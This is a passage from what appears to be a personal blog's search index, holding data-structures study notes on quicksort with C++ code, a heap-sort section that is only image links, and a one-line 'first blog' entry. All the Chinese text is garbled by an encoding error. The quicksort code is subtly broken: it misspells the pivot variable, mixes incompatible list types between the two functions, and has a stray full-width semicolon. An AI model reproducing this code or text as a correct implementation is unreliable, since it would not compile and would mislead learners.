<h2 id="å¿«é€Ÿæ’åº"><a href="#å¿«é€Ÿæ’åº" class="headerlink" title="å¿«é€Ÿæ’åº"></a>å¿«é€Ÿæ’åº</h2><p><strong>åŸºæœ¬æ€æƒ³ï¼šå–å¾…æ’åºåºåˆ—ä¸­ä¸€ä¸ªå…ƒç´ ä½œä¸ºåŸºå‡†ï¼ŒæŒ‰ç…§è¯¥å…ƒç´ çš„æ’åºç çš„å¤§å°ï¼Œå°†æ•´ä¸ªå…ƒç´ åˆ†ä¸ºå·¦å³ä¸¤ä¸ªå­åºåˆ—ï¼Œå·¦ä¾§éƒ½å°äºè¯¥æ’åºç ï¼Œå³ä¾§éƒ½å¤§äºã€‚ç„¶åï¼Œé‡å¤å®è¡Œè¿™ä¸ªæ–¹æ³•ï¼Œç›´åˆ°åºåˆ—æœ‰åºã€‚</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703204842947.png" alt="image-20200703204842947"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¿«é€Ÿæ’åºçš„ç®—æ³•</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">QuickSort</span> (<span class="title">dataList</span>&lt;T&gt;&amp; <span class="title">L</span>,  <span class="title">int</span> <span class="title">left</span>,  <span class="title">int</span> <span class="title">right</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//å¯¹Vector[left..right]è¿›è¡Œæ’</span></span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;		<span class="comment">//å…ƒç´ åºåˆ—é•¿åº¦å¤§äº1æ—¶</span></span><br><span class="line">        <span class="keyword">int</span> pivotpos = L.Partition (left, right);    <span class="comment">//åˆ’åˆ†</span></span><br><span class="line">        QuickSort (L, left, pivotpos<span class="number">-1</span>);</span><br><span class="line">        QuickSort (L, pivotpos+<span class="number">1</span>, right);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;ï¼›</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">( SqList &amp;L,  <span class="keyword">int</span> low,  <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    L.r[<span class="number">0</span>] = L.r[low];</span><br><span class="line">    pivitkey = L.r[low].key;</span><br><span class="line">    <span class="keyword">while</span>( low &lt; high)&#123;</span><br><span class="line">         <span class="keyword">while</span>( low &lt; high &amp;&amp; L.r[high].key &gt;= pivotkey)  --high;</span><br><span class="line">         L.r[low] = L.r[high];</span><br><span class="line">         <span class="keyword">while</span>( low &lt; high &amp;&amp; L.r[low].key &lt;= pivotkey)  ++low;</span><br><span class="line">         L.r[high] = L.r[low];</span><br><span class="line">    &#125;</span><br><span class="line">    L.r[low] = L.r[<span class="number">0</span>];   </span><br><span class="line">    <span class="keyword">return</span> low;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>å¿«é€Ÿæ’åºæ˜¯ä¸€ç§ä¸ç¨³å®šçš„æ’åºç®—æ³•</strong></p>
<h2 id="å †æ’åº"><a href="#å †æ’åº" class="headerlink" title="å †æ’åº"></a>å †æ’åº</h2><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223906279.png" alt="image-20200703223906279"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223916193.png" alt="image-20200703223916193"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223926277.png" alt="image-20200703223926277"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223943434.png" alt="image-20200703223943434"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223950979.png" alt="image-20200703223950979"></p>
]]></content>
      <categories>
        <category>æ•°æ®ç»“æ„ä¸ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å¤ä¹ </tag>
        <tag>æ•°æ®ç»“æ„</tag>
      </tags>
  </entry>
  <entry>
    <title>æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢</title>
    <url>/2020/06/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>2020/6/27 æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢</p>
]]></content>
  </entry>
</search>
